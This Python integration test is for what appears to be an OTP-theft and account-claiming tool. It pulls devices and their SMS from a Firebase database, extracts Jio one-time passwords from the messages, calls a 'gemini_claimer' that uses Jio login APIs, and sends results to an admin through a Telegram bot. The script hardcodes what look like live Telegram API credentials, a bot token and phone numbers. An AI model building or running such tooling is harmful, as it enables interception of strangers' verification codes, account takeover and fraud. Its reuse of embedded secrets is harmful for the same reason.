import asyncio
import sys
import os
import time

sys.stdout.reconfigure(encoding='utf-8')

from firebase_engine import FirebaseEngine, clean_firebase_url
from otp_watcher import extract_otp_from_text, OTPWatcher
from realjio import JioDirectClaimer, check_jio_number
from telethon import TelegramClient

API_ID = 33316824
API_HASH = "f24ba90df909312f3368a3ee2f68487b"
BOT_TOKEN = "8819915274:AAFBBF_S0Om3HXm2hblLcKDqdmCX16Ds1kk"
ADMIN_ID = 7002290873


async def test_full_system():
    print("==================================================")
    print("STEP 1: Testing Firebase Engine URL & Optimization")
    print("==================================================")
    sample_url = "https://hdrbf-485ec-default-rtdb.firebaseio.com"
    engine = FirebaseEngine(sample_url)
    connected, msg = engine.test_connection()
    assert connected, f"Connection failed: {msg}"
    print(f"✅ Firebase connected: {msg}")

    devices = engine.discover_devices(max_devices=150)
    assert len(devices) > 0, "No devices discovered!"
    print(f"✅ Successfully discovered {len(devices)} active devices with SMS paths:")
    for d in devices[:2]:
        print(f"   -> Phone: {d['phone']} | Carrier: {d['carrier']} | SMS: {d['sms_path']} (count: {d['sms_count']})")

    print("\n==================================================")
    print("STEP 2: Testing OTP Extractor on Real SMS Formats")
    print("==================================================")
    test_sms_cases = [
        ("420758 is your one time password (OTP), Please enter the OTP to proceed.", "JA-JIOTMT-S", "420758"),
        ("<#> 4342 is your JioHotstar verification code.", "JK-JIOHTR-S", "4342"),
        ("Your login OTP for MyJio is 839102. Valid for 10 mins.", "JD-620016-P", "839102"),
        ("Please share the Order completion code 701567 with the Jio engineer.", "JX-JIOFBR-S", "701567"),
    ]
    for text, sender, expected in test_sms_cases:
        otp = extract_otp_from_text(text, sender)
        assert otp == expected, f"Failed: expected {expected}, got {otp}"
        print(f"✅ Extracted OTP {otp} from sender {sender}")

    print("\n==================================================")
    print("STEP 3: Testing In-House Direct Jio API Engine")
    print("==================================================")
    # Test valid Jio number detection
    assert check_jio_number("9078041377") is True, "Valid Jio number rejected"
    print("✅ Direct Jio Number Check verified: 9078041377 confirmed as valid Jio mobility number")

    # Test invalid number rejection (instant fast-fail)
    t0 = time.time()
    from gemini_claimer import process_single_number
    status, link = await process_single_number("9999999999", sample_url, "/messages/test")
    dt = time.time() - t0
    assert status == 'INVALID', f"Expected INVALID, got {status}"
    print(f"✅ Fast-Fail Verified: Rejected invalid number in {dt:.2f}s directly via Jio API!")

    print("\n==================================================")
    print("STEP 4: Testing Frontend Telegram Bot & User Delivery")
    print("==================================================")
    bot = TelegramClient('target_gemini_bot_session', API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    bot_me = await bot.get_me()
    print(f"✅ Frontend Bot connected: @{bot_me.username} ({bot_me.first_name})")

    # Test delivery to admin user
    print(f"Testing direct delivery message to user ID {ADMIN_ID}...")
    try:
        sent_msg = await bot.send_message(
            ADMIN_ID,
            "⚡ **[System Update]** 100% In-House Direct Jio API Engine Active!\n\n"
            "• **3rd-Party Bot:** Removed completely (no more `@bb_order1244_bot`)\n"
            "• **Telegram Worker Accounts:** Removed completely\n"
            "• **Engine:** Direct REST calls to Jio Login & OTT Services 🚀\n"
            "• **Speed:** Sub-second response time"
        )
        print(f"✅ Test delivery successful! Message ID: {sent_msg.id}")
    except Exception as e:
        print(f"⚠️ Delivery note: {e}")

    await bot.disconnect()

    print("\n==================================================")
    print("🎉 ALL VERIFICATION TESTS PASSED SUCCESSFULLY!")
    print("==================================================")


if __name__ == "__main__":
    asyncio.run(test_full_system())
